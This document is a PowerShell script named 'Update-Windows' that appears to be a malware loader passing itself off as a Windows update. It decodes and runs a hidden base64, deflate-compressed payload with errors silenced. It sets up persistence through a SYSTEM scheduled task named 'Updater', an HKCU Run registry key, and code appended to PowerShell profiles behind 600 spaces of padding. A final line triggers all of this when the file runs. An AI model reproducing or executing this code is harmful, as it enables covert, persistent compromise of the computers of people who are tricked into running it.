function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('vVZtb5tIEP6cSv0PqLJkrDgGJ26ai1TpAIONa1ITbPxW60RgDRsvC4UlNun1v99gQ5K2ySl3Jx2y5H2ZmX3mmZmdXWfUZTiiHD7/kI8HyXuR+/b2zdHISZyQ42ubxXzY7/l28ik0mlwtaMfbXmdsI/0KN46OQLB2MzfOZ5sR95Hjl1Icd6PQwXR1ealkSYIoO8xbPcSkNEXhDcEo5Rvcn9w0QAk6+Xxzi1zGfeNqf7R6JLpxSCmWK44bIO5Eol6xN4xcp4DZsmKCGV//8qXeWJ60Vy31a+aQlK9becpQ2PIIqTe4743iwHEeI75uYDeJ0mjNWlNMz05bE5o6a3QF1u6QgVgQeWm9AY7AL0EsSyhXuVTYOEjwdRiOksiVPC9BKSi0dHoXbRBfoxkhTe53flkCuM4owyGCfYaSKLZQcoddlLb6DvUIukbrFX+FtpXfr1XinyqB1IgljSaE53mkRuRlBB2U641fsf4Q1QZ8P0cW+Pj+9s3bN+sqOSiKZ9SynqYGjI6W+zEC0PwoSvFe9CMnNjkDznZYlOQwrY2TDDVW3LKIx3K14mrJ1ZoN7DR0mi8baVcaIJ/j9GtXnsLq0o6wtwKtMmK16KwnWsPzRafXK7ZfTsAuWmOKujl1QuxWOcY/Fwu0JmjvdasSuwJ4fL3cQF4XEeQ7rKC2yS1/VVNDzB505QwTDyWSC/FMARWEuvEjmEO0+LpODRQCZYd5HWKyhsxGlXSZzXl1ejEHobpCnDRtcqMMSsttchZyCPKanERTXG5JGYv2w/ojXCMjDLtOyipzq8ZPdJbHKhFNWZK5EEygYGzFyMUOKRhpcn3sITm3sF8dX3+WD8UhBFMfLN1BPGCl4MFiRYokgPQxHRotCzE9jAkKQXBf7xpxfKjuskD2ieX4yKu/gLYqgkPGF/RUvDzBCjG3SMSanI0TBrdHQXWZYv8BzZP74ykuJUFlsPiqqpZyzopCqDHNsIqsLSnbE5QwIEdLolB2UnTesVgC1PHvBBV334+60b0En6pdm7ZsTeyFbngDYunMmqt4OAkCHbd1H+b5RPVHTIw/jcf9gdXtS0l3F6wlPdXVvpybbVly+/iDPZAnE9DDytC83emSJ4f+zJ8rW30UzHQ4SBn6ug//sh64srgQfVnUlKElByoWJd8y+2anvdCFCyLje0u3pP704byHc9ROpz/bjaUrYyAF2mdPa59qe/1Nob/Y9IZddT93i7k5T1WswjmqNjftAE3tWJ6q2sK0Y90/3vqmPRQ6WiDDuo53w9gS4Gu3B3fUuzfIxb0BcE17McBoofso9yVTkqw5JdbNVpG6AUvkLFdEbQJrm7FOd+ZNbHj5vC/8ZhsYxZFkqpKkEajaUHK2XaE9jTTTfm9OVHGXT8TdVr0VtioebDfl/6R3fu4L685IsC2d9p1ABrz5oLPBg2PYCx1bnK8Fu+BP2VDhns7I+cDYcwr+mKCDC84c/xr0DjoSo/pMEGxf8KU1sXX/wvRnET11NmB76kuAEHyEWK8HuuECVoI3k+OZ0J4AHjEc7MQCazi4AHunm2dsWgFw6y0cSS5wyNNeJE03vXMlvxgZ4IfdBpvUzsbTPtgEzNnmoqAZ4tu1FNqz9Nmpd3MtC8fe3PHlRXYseZ/8WMZeIrTNjx/fFeUA9VCL7+abJ/n9UpcznCQNHAJ5D72ruo+0KNHK7jOKcKHB849PlA1KKCLQzaHfV2UsERK5RVesmhU05UOrXMG1NIHh2emzowb3INh47JbV0uXlAtDCxVBUa2uIqM+Cprg7E0Xoc+KuI4K3r/dQieKc35tqFn1yT1Flm+xtN4oronaLdNr+H7grr6cA/rxXcPe49je7r+JTbB58/2X5x4V/RO6/o2DqYAbiFtyzBB3eAi8yUSbMkzfVPlCQD+vyK562nzN2cgVvrb8A'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC DAILY /ST 12:15:00 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload='New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe`" -NonInteractive -WindowStyle Hidden"'}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist